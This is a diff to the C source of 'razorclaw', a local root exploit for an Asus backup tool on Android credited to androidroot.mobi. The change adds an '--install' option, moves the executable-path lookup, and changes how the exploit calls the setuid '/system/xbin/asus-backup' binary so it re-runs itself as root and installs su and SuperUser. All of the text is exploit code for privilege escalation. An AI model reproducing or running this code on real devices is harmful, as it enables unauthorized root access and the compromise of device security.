@@ -177,19 +177,24 @@ int main(int argc, const char **argv)
     char cmd[1024];
     int rc;
 
-    readlink("/proc/self/exe", path, sizeof(path));
-    path[strrchr(path, '/') - path] = '\0';
-
     printf("razorclaw - asus backup local root exploit.\n");
     printf("by androidroot.mobi\n");
     printf("-------------------------------------------\n\n");
 
     if(getuid() == 0) {
-        printf("[+] already root. Installing SuperUser and su\n");
-        chdir(path);
-        return do_root();
+        if(argc > 1 && !strcasecmp(argv[1], "--install")) {
+            printf("[+] installing SuperUser and su\n");
+            return do_root();
+        } else {
+            printf("[-] already root and nothing to do.\n\n");
+            printf("[*] hint: to install SuperUser and su pass the "
+                   "--install parameter on the command line.\n");
+            return 1;
+        }
     }
 
+    readlink("/proc/self/exe", path, sizeof(path));
+    path[strrchr(path, '/') - path] = '\0';
 
     if(chdir(path)) {
         printf("[-] could not chdir into directory: %s\n", path);
@@ -210,7 +215,8 @@ int main(int argc, const char **argv)
         printf("[+] created fake database.\n");
     }
 
-    snprintf(cmd, sizeof(cmd), "/system/xbin/asus-backup %s %s/%s",
+    snprintf(cmd, sizeof(cmd),
+             "/system/xbin/asus-backup %s %s/%s --install >/dev/null",
              SECURE_ARG, path, strrchr(argv[0], '/') + 1);
 
     if(argc > 1 && !strcasecmp(argv[1], "--install")) {
